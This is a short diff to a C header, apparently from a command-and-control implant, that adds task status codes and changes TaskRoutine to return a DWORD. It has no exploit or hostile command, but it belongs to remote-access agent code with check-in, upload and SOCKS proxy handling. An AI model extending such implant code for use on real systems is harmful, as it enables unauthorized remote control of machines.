@@ -75,7 +75,12 @@
 #define UPLOAD_RESP     0xCD
 #define SOCKS_RESP      0xCE
 
+/* Task handler return status */
+#define TASK_STATUS_ERROR   0x00
+#define TASK_STATUS_OK      0x01
+#define TASK_STATUS_EXIT    0x02    // signal the main handler loop to exit
+
 BOOL TaskCheckin(PPARSER checkinResponseData);
-VOID TaskRoutine();
+DWORD TaskRoutine();
 
 #endif //TASK_H
